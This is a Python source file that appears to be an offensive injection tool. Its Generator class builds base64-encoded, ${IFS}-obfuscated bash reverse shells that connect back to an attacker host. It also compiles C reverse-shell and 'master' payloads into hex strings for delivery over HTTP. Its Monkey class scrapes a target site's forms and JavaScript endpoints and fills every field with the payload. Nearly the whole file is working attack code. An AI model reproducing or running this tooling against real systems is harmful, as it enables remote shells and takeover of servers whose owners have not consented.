import re
from bs4 import BeautifulSoup
import requests
import json
import base64
import subprocess
import os


def extract_machine_code(filename):
    # implement objdump -d in python?
    result = subprocess.run(['objdump', '-d', filename], stdout=subprocess.PIPE)
    output = result.stdout.decode()

    lines = output.split('\n')
    machine_code = ''

    for line in lines:
        if ':' in line and 'file' not in line:
            parts = line.split(':')
            if len(parts) > 1:
                code = parts[1]
                bytes = code.strip().split(' ')[:6]
                machine_code += ''.join(f'\\x{byte}' for byte in bytes if byte)

    return machine_code


class Generator:
    def __init__(self, lhost, lport):
        self.lhost = lhost
        self.lport = lport

    def ir_shell(self):
        return Generator.shell_reverse_shell(self.lhost, self.lport)

    def ir_bin(self):
        return Generator.bin_reverse_shell(self.lhost, self.lport)

    @staticmethod
    def shell_reverse_shell(lhost, lport=80, s='bash'):
        sh = f'{s} -i >& /dev/tcp/{lhost}/{lport} 0>&1'

        sh_enc = base64.b64encode(sh.encode('utf-8')).decode('utf-8')

        wrapped = f'echo${{IFS}}{sh_enc}|base64${{IFS}}-d|{s}'

        return wrapped

    @staticmethod
    def set_host_port(file_path, new_host, new_port):
        with open(file_path, 'r') as file:
            lines = file.readlines()

        new_lines = []
        for line in lines:
            if line.strip().startswith('const char* IP ='):
                new_lines.append(f'const char* IP = "{new_host}";\n')
            elif line.strip().startswith('const int PORT ='):
                new_lines.append(f'const int PORT = {new_port};\n')
            else:
                new_lines.append(line)

        with open(file_path, 'w') as file:
            file.writelines(new_lines)

    @staticmethod
    def bin_master(lhost, lport, static=False):
        name = 'cmaster'

        compiled_path = f'tmp/{name}'

        src_path = 'payloads/master.c'

        Generator.set_host_port(src_path, lhost, lport)

        compiler_args = [
            'gcc',
            src_path,
            '-o',
            compiled_path,
            '-Os',
            '-flto',
        ]

        if static:
            compiler_args.append('-static')

        subprocess.run(['rm', '-f', compiled_path])  # todo abstract this?
        subprocess.run(compiler_args)
        subprocess.run(['strip', '-s', compiled_path])

        payload = None

        with open(compiled_path, 'rb') as file:
            binary_content = file.read()
            payload = ''.join(f'\\x{byte:02x}' for byte in binary_content)

        return payload

    @staticmethod
    def bin_reverse_shell(lhost, lport, static=False):
        name = 'cshell'

        os.makedirs('tmp', exist_ok=True)
        compiled_path = f'tmp/{name}'

        src_path = 'payloads/reverse_shell.c'

        Generator.set_host_port(src_path, lhost, lport)

        compiler_args = [
            'gcc',  # can use tcc as well
            src_path,
            '-o',
            compiled_path,
            '-Os',
            '-flto',
        ]

        if static:  # might not always fit in an http request
            compiler_args.append('-static')

        subprocess.run(['rm', '-f', compiled_path])
        subprocess.run(compiler_args)
        subprocess.run(['strip', '-s', compiled_path])

        payload = None

        with open(compiled_path, 'rb') as file:
            binary_content = file.read()
            payload = ''.join(f'\\x{byte:02x}' for byte in binary_content)

        return payload


class Monkey:
    forms = []
    url = ''
    js_endpoints = []
    js_http_methods = []

    protocol = ''
    host = ''

    def __init__(self, url):
        self.url = url

        self.protocol = url.split("://")[0] + '://'
        self.host = url.split("://")[1].split("/")[0]

        response = requests.get(url)
        soup = BeautifulSoup(response.content, "html.parser")

        self.forms = soup.find_all("form")
        self.inputs = soup.find_all("input")

        for form in self.forms:
            form_inputs = form.find_all("input")
            for form_input in form_inputs:
                if form_input in self.inputs:
                    self.inputs.remove(form_input)

        # extract js
        scripts = soup.find_all("script")
        js_code = "".join(script.string for script in scripts if script.string)

        # extract methods
        self.extract_js_endpoints_and_methods(js_code)

    def extract_js_endpoints_and_methods(self, js_code):
        pattern = r"""
            (fetch|axios\.(get|post)|\.ajax|\.get|\.post|XMLHttpRequest)\(.*?['\"](.*?)['\"]
            | # OR
            method:\s*['\"](GET|POST|PUT|DELETE)['\"]
        """
        matches = re.findall(pattern, js_code, re.IGNORECASE | re.VERBOSE)

        self.js_endpoints = []
        self.js_http_methods = []

        for match in matches:
            function, http_method, url, method_in_obj = match
            if function:
                method = 'GET' if 'get' in function.lower() else 'POST'
                self.js_endpoints.append(url)
                self.js_http_methods.append(http_method.upper() if http_method else method)
            elif method_in_obj:
                # update the last method if specified in an object (for 'fetch' or '.ajax')
                self.js_http_methods[-1] = method_in_obj

    def get_inputs(self):
        return self.inputs

    def get_forms(self):
        return self.forms

    def get_js_endpoints(self):
        return self.js_endpoints

    def get_js_http_methods(self):
        return self.js_http_methods

    def get_js_urls(self):
        return [(self.protocol + self.host + e) for e in self.js_endpoints]

    def autoinject_forms(self, payload):
        injectable = {}
        form_inputs = self.get_forms()[0].find_all("input")

        for form_input in form_inputs:
            injectable[form_input.get("name")] = payload

        res = self.inject_forms(injectable)

        return res.decode()

    def autoinject_urls(self, payload):
        injectable = {}
        inputs = self.get_inputs()
        js_urls = self.get_js_urls()

        for (input, url) in zip(inputs, js_urls):
            print(input, url)
            injectable[input.get("name")] = payload

        res = self.inject_fetch(injectable)

        return res.decode()

    def inject_forms(self, custom_data):
        for form in self.forms:
            action_url = form.get("action")

            inputs = form.find_all("input")

            form_data = {}

            for input in inputs:
                input_name = input.get("name")
                input_value = input.get("value")
                form_data[input_name] = input_value

            form_data.update(custom_data)

            headers = {
                'Content-Type': 'application/json' # can be x-www-form-urlencoded as well depending on the target server
            }

            response = requests.post(self.protocol + self.host + action_url, data=json.dumps(form_data), headers=headers)

            return response.content

    def inject_fetch(self, custom_data):
        for (method, url) in zip(self.get_js_http_methods(), self.get_js_urls()):
            if method == 'GET':
                response = requests.get(url, params=custom_data)
            elif method == 'POST':
                headers = {
                    'Content-Type': 'application/json'
                }
                response = requests.post(url, data=json.dumps(custom_data), headers=headers)
            else:
                print(f"unhandled method: {method} for url: {url}")

            return response.content
